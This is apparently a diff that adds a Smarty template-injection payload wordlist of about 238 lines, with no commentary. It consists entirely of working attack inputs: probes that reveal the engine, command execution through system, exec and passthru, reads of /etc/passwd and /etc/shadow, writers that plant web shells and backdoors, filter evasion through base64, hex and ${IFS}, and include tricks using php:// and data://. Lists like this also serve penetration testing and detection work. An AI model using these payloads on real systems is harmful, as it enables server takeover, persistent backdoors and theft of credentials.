@@ -1,0 +1,238 @@
+{7*7}
+{7*'7'}
+{$smarty}
+{$smarty.version}
+{$smarty.template}
+{$smarty.current_dir}
+{$smarty.template_dir}
+{$smarty.config_dir}
+{$smarty.plugins_dir}
+{$smarty.compile_dir}
+{$smarty.cache_dir}
+{$smarty.now}
+{$smarty.const}
+{$smarty.server}
+{$smarty.env}
+{$smarty.session}
+{$smarty.get}
+{$smarty.post}
+{$smarty.cookies}
+{$smarty.request}
+{php}system('id');{/php}
+{php}exec('id');{/php}
+{php}passthru('id');{/php}
+{php}shell_exec('id');{/php}
+{php}system('whoami');{/php}
+{php}system('cat /etc/passwd');{/php}
+{php}system('ls -la');{/php}
+{php}system('uname -a');{/php}
+{php}system('pwd');{/php}
+{php}system('env');{/php}
+{php}system('cat flag.txt');{/php}
+{php}system('ps aux');{/php}
+{php}system('ifconfig');{/php}
+{php}system('netstat -an');{/php}
+{php}system('cat /etc/shadow');{/php}
+{php}phpinfo();{/php}
+{php}eval($_GET['cmd']);{/php}
+{php}eval($_POST['cmd']);{/php}
+{php}eval($_REQUEST['cmd']);{/php}
+{php}echo `id`;{/php}
+{php}echo `whoami`;{/php}
+{php}echo `cat /etc/passwd`;{/php}
+{php}echo file_get_contents('/etc/passwd');{/php}
+{php}echo file_get_contents('flag.txt');{/php}
+{php}echo readfile('/etc/passwd');{/php}
+{php}echo readfile('flag.txt');{/php}
+{php}print_r(scandir('/'));{/php}
+{php}print_r(scandir('.'));{/php}
+{php}var_dump(scandir('/'));{/php}
+{php}highlight_file('/etc/passwd');{/php}
+{php}highlight_file('flag.txt');{/php}
+{php}show_source('/etc/passwd');{/php}
+{php}show_source('flag.txt');{/php}
+{php}$output=shell_exec('id');echo $output;{/php}
+{php}$output=shell_exec('whoami');echo $output;{/php}
+{php}$output=shell_exec('cat /etc/passwd');echo $output;{/php}
+{php}file_put_contents('shell.php','<?php system($_GET[cmd]); ?>');{/php}
+{php}file_put_contents('info.php','<?php phpinfo(); ?>');{/php}
+{php}file_put_contents('backdoor.php','<?php eval($_POST[cmd]); ?>');{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+{system('id')}
+{system('whoami')}
+{system('cat /etc/passwd')}
+{system('ls -la')}
+{system('uname -a')}
+{exec('id')}
+{exec('whoami')}
+{exec('cat /etc/passwd')}
+{passthru('id')}
+{passthru('whoami')}
+{passthru('cat /etc/passwd')}
+{shell_exec('id')}
+{shell_exec('whoami')}
+{shell_exec('cat /etc/passwd')}
+{`id`}
+{`whoami`}
+{`cat /etc/passwd`}
+{file_get_contents('/etc/passwd')}
+{file_get_contents('flag.txt')}
+{readfile('/etc/passwd')}
+{readfile('flag.txt')}
+{phpinfo()}
+{highlight_file('/etc/passwd')}
+{show_source('/etc/passwd')}
+{scandir('/')}
+{scandir('.')}
+{self::getStreamVariable("file:/etc/passwd")}
+{self::getStreamVariable("file:flag.txt")}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php phpinfo(); ?>",self::clearConfig())}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['x']); ?>",self::clearConfig())}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php eval($_POST['x']); ?>",self::clearConfig())}
+{function name='x' a='system'}{$a('id')}{/function}{x}
+{function name='x' a='exec'}{$a('id')}{/function}{x}
+{function name='x' a='passthru'}{$a('id')}{/function}{x}
+{function name='x' a='shell_exec'}{$a('id')}{/function}{x}
+{function name='x'}{php}system('id');{/php}{/function}{x}
+{function name='x'}{php}phpinfo();{/php}{/function}{x}
+{$smarty.template_object->smarty->_getSmartyObj()->display('string:<?php system($_GET[cmd]); ?>')}
+{$smarty.template_object->smarty->display('string:{php}system($_GET[cmd]);{/php}')}
+{math equation='system("id")'}
+{math equation='exec("id")'}
+{math equation='passthru("id")'}
+{math equation='shell_exec("id")'}
+{assign var='cmd' value='system'}
+{$cmd('id')}
+{assign var='cmd' value='exec'}
+{$cmd('id')}
+{assign var='cmd' value='passthru'}
+{$cmd('id')}
+{assign var='cmd' value='shell_exec'}
+{$cmd('id')}
+{assign var='cmd' value='phpinfo'}
+{$cmd()}
+{assign var='a' value='system'}{$a('id')}
+{assign var='a' value='exec'}{$a('whoami')}
+{assign var='a' value='passthru'}{$a('cat /etc/passwd')}
+{assign var='a' value='shell_exec'}{$a('ls -la')}
+{assign var='a' value='file_get_contents'}{$a('/etc/passwd')}
+{assign var='a' value='readfile'}{$a('/etc/passwd')}
+{assign var='a' value='highlight_file'}{$a('/etc/passwd')}
+{assign var='a' value='show_source'}{$a('/etc/passwd')}
+{assign var='a' value='scandir'}{$a('/')}
+{assign var='a' value='phpinfo'}{$a()}
+{capture name='x'}{php}system('id');{/php}{/capture}
+{capture name='x'}{php}phpinfo();{/php}{/capture}
+{capture name='x'}{php}eval($_GET['cmd']);{/php}{/capture}
+{literal}{php}system('id');{/php}{/literal}
+{literal}{php}phpinfo();{/php}{/literal}
+{if system('id')}{/if}
+{if exec('id')}{/if}
+{if passthru('id')}{/if}
+{if shell_exec('id')}{/if}
+{if phpinfo()}{/if}
+{foreach from=system('id') item=i}{/foreach}
+{foreach from=exec('id') item=i}{/foreach}
+{section name=x loop=system('id')}{/section}
+{section name=x loop=exec('id')}{/section}
+{php}system('cat${IFS}/etc/passwd');{/php}
+{php}system('cat$IFS/etc/passwd');{/php}
+{php}system('cat</etc/passwd');{/php}
+{php}system('cat<flag.txt');{/php}
+{system('cat${IFS}/etc/passwd')}
+{system('cat$IFS/etc/passwd')}
+{exec('cat</etc/passwd')}
+{passthru('cat<flag.txt')}
+{$smarty.server.DOCUMENT_ROOT}
+{$smarty.server.SERVER_NAME}
+{$smarty.server.SERVER_ADDR}
+{$smarty.server.SERVER_SOFTWARE}
+{$smarty.server.HTTP_HOST}
+{$smarty.server.HTTP_USER_AGENT}
+{$smarty.server.SCRIPT_FILENAME}
+{$smarty.server.SCRIPT_NAME}
+{$smarty.server.PHP_SELF}
+{$smarty.server.REQUEST_URI}
+{$smarty.server.QUERY_STRING}
+{$smarty.server.PATH_INFO}
+{$smarty.env.PATH}
+{$smarty.env.HOME}
+{$smarty.env.USER}
+{$smarty.env.SHELL}
+{php}system('calc');{/php}
+{php}system('cmd /c calc');{/php}
+{php}system('cmd /c dir');{/php}
+{php}system('powershell.exe');{/php}
+{php}system('cmd.exe /c whoami');{/php}
+{system('calc')}
+{system('cmd /c calc')}
+{system('cmd /c dir')}
+{system('cmd /c whoami')}
+{exec('cmd /c whoami')}
+{passthru('cmd /c whoami')}
+{shell_exec('cmd /c whoami')}
+{php}popen('id','r');{/php}
+{php}proc_open('id',array(),$pipes);{/php}
+{php}pcntl_exec('/bin/sh',array('-c','id'));{/php}
+{php}assert('system("id")');{/php}
+{php}assert('phpinfo()');{/php}
+{php}create_function('','system("id");');{/php}
+{php}call_user_func('system','id');{/php}
+{php}call_user_func('exec','id');{/php}
+{php}call_user_func('passthru','id');{/php}
+{php}call_user_func('shell_exec','id');{/php}
+{php}call_user_func('phpinfo');{/php}
+{php}call_user_func_array('system',array('id'));{/php}
+{php}array_map('system',array('id'));{/php}
+{php}array_filter(array('id'),'system');{/php}
+{php}uasort(array('id'=>0),'system');{/php}
+{php}uksort(array('id'=>0),'system');{/php}
+{php}usort(array('id'),'system');{/php}
+{include file='/etc/passwd'}
+{include file='flag.txt'}
+{include file='php://filter/convert.base64-encode/resource=/etc/passwd'}
+{include file='php://filter/convert.base64-encode/resource=flag.txt'}
+{include file='php://input'}
+{include file='data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg=='}
+{include file='data://text/plain,<?php system($_GET[cmd]); ?>'}
+{config_load file='/etc/passwd'}
+{config_load file='flag.txt'}
+{insert name='system' script='id'}
+{insert name='exec' script='id'}
+{insert name='passthru' script='id'}
+{php}$a='sy'.'stem';$a('id');{/php}
+{php}$a='ex'.'ec';$a('id');{/php}
+{php}$a='pass'.'thru';$a('id');{/php}
+{php}$a='sh'.'ell_exec';$a('id');{/php}
+{php}$a=base64_decode('c3lzdGVt');$a('id');{/php}
+{php}$a="\x73\x79\x73\x74\x65\x6d";$a('id');{/php}
+{php}@system('id');{/php}
+{php}@exec('id');{/php}
+{php}@passthru('id');{/php}
+{php}@shell_exec('id');{/php}
+{php}@phpinfo();{/php}
+{$smarty.const._MY_MPDF_PATH}
+{php}ini_set('display_errors','1');{/php}
+{php}error_reporting(E_ALL);{/php}
+{php}phpversion();{/php}
+{php}php_uname();{/php}
+{php}getmyuid();{/php}
+{php}getmygid();{/php}
+{php}getmypid();{/php}
+{php}getmyinode();{/php}
+{php}getlastmod();{/php}
+{php}get_current_user();{/php}
+{php}getcwd();{/php}
+{php}disk_free_space('/');{/php}
+{php}disk_total_space('/');{/php}
+{php}get_cfg_var('upload_max_filesize');{/php}
+{php}get_cfg_var('post_max_size');{/php}
+{php}ini_get('disable_functions');{/php}
+{php}ini_get('open_basedir');{/php}
+{php}ini_get('safe_mode');{/php}
+{php}get_loaded_extensions();{/php}
+{php}get_defined_functions();{/php}
+{php}get_defined_constants();{/php}
+{php}print_r($_SERVER);{/php}
+{php}print_r($_ENV);{/php}
+{php}print_r(get_defined_vars());{/php}
